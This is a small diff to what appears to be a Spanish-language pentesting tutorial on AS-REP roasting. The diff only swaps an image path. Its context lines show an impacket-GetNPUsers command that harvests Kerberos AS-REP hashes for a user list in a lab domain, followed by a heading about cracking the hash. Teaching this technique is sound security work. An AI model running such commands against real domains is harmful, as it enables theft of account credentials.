@@ -98,7 +98,7 @@ Una vez lo tenemos almacenados utilizamos impacket-GetNPUsers para comprobar cua
 
 `impacket-GetNPUsers hackpoc/ -usersfile users.txt -format hashcat -outputfile as_rep.txt`
 
-![Hash krb5asrep conseguido](../../.gitbook/assets/as_rep2%20%281%29.png)
+![Hash krb5asrep conseguido](../../.gitbook/assets/as_rep2%20%282%29%20%281%29.png)
 
 ### 2. Crackear el Hash
 
